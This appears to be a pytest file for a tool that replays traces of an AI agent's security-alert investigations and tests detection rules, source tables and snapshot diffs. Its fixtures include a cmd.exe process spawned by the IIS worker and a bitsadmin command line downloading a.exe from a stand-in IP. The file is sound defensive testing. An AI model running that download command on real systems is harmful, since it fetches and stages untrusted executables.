import json
from pathlib import Path
from typing import Any

from sibyl_h0und.replay import (
    diff,
    load_tasks,
    read_baseline,
    replay,
    rule_table,
    snapshot,
    source_changes,
    source_table,
)
from sibyl_h0und.trace import TaskTrace, task_trace_path

SHELL_PROCESS = {
    "id": "proc-1",
    "type": "windows_process",
    "properties": {
        "image_path": "C:\\Windows\\System32\\cmd.exe",
        "parent_image": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
    },
}


CATALOG = json.dumps(
    [
        {"name": "get_entity", "parameters": {"type": "object"}},
        {"name": "finish_investigation", "parameters": {"type": "object"}},
    ]
)


def write_trace(root: Path, run: str, verdict: str, quality: float, result: dict[str, Any]) -> None:
    """Write the trace of one task `t1`, with the writer the agent uses: a read and a verdict."""
    trace = TaskTrace(task_trace_path(root / run, 1, "t1"), run_id=run, task_id="t1")
    observation = {"available_tools": CATALOG, "alert_text": "Alert."}
    trace.task_start({}, {"observation": observation}, {})
    read = {"observation": {"last_tool_result": json.dumps(result)}, "info": {}}
    trace.tool_call("get_entity", {"entity_id": "x"}, read, 1)
    report = {"task_result": {"completion_reason": "terminated"}, "info": {}, "observation": {}}
    trace.tool_call("finish_investigation", {"submission": {"verdict": verdict}}, report, 1)
    trace.task_end({"completion_reason": "terminated", "quality_score": quality}, None)


def test_replay_separates_runs_that_repeat_a_task_id(tmp_path: Path) -> None:
    """Practice runs reuse task ids, so each run is judged and counted on its own."""
    write_trace(tmp_path / "traces", "run-a", "benign", 0.0, SHELL_PROCESS)
    write_trace(tmp_path / "traces", "run-b", "benign", 0.9, {"id": "x", "type": "host"})

    tasks = load_tasks(tmp_path / "traces", tmp_path / "cache")
    findings, _ = replay(tasks)

    assert [(task["run_id"], task["verdict"]) for task in tasks] == [
        ("run-a", "benign"),
        ("run-b", "benign"),
    ]
    assert rule_table(tasks, findings, wrong_below=0.2) == [
        {
            "rule": "web_server_spawns_shell",
            "source": "builtin",
            "wrong_tasks": "1/1",
            "other_tasks": "0/1",
            "nodes": 1,
        }
    ]
    assert load_tasks(tmp_path / "traces", tmp_path / "cache") == tasks


def test_diff_lists_findings_gained_and_lost_per_task() -> None:
    """A rule change shows up as a per-task difference between two snapshots."""
    old = snapshot({"r:t1": [], "r:t2": []})["tasks"]
    new = {"r:t1": ["rule|n1|high"], "r:t2": []}

    assert diff(old, new) == {"r:t1": {"gained": ["rule|n1|high"], "lost": []}}


def test_new_source_shows_up_per_source_in_tables_and_compare(tmp_path: Path) -> None:
    """A source's effect is visible on its own: fired tasks, shown flags and the diff."""
    lolbin = {
        "id": "proc-2",
        "type": "windows_process",
        "properties": {
            "image_path": "C:\\Windows\\System32\\bitsadmin.exe",
            "command_line": "bitsadmin /transfer j http://198.51.100.7/a.exe C:\\a.exe",
        },
    }
    write_trace(tmp_path / "traces", "run-a", "benign", 0.0, {"entities": [SHELL_PROCESS, lolbin]})
    tasks = load_tasks(tmp_path / "traces", tmp_path / "cache")
    findings, shown = replay(tasks)

    rows = {row["source"]: row for row in source_table(tasks, findings, shown, wrong_below=0.2)}
    assert rows["lolbas"]["wrong_tasks"] == "1/1"
    assert rows["lolbas"]["shown"] == 1

    # A baseline saved before the source existed, in the older form without sources.
    old = read_baseline({"run-a:t1": ["web_server_spawns_shell|proc-1|high"]})
    current = snapshot(findings)
    changes = diff(old["tasks"], current["tasks"])
    counts = source_changes(changes, {**old["sources"], **current["sources"]})

    assert counts["lolbas"] == {"gained": 2, "lost": 0}


def test_cache_of_another_trace_directory_is_not_reused(tmp_path: Path) -> None:
    """A different or empty trace directory must not answer with the old tasks."""
    write_trace(tmp_path / "traces", "run-a", "benign", 0.0, SHELL_PROCESS)
    assert len(load_tasks(tmp_path / "traces", tmp_path / "cache")) == 1

    (tmp_path / "empty").mkdir()

    assert load_tasks(tmp_path / "empty", tmp_path / "cache") == []
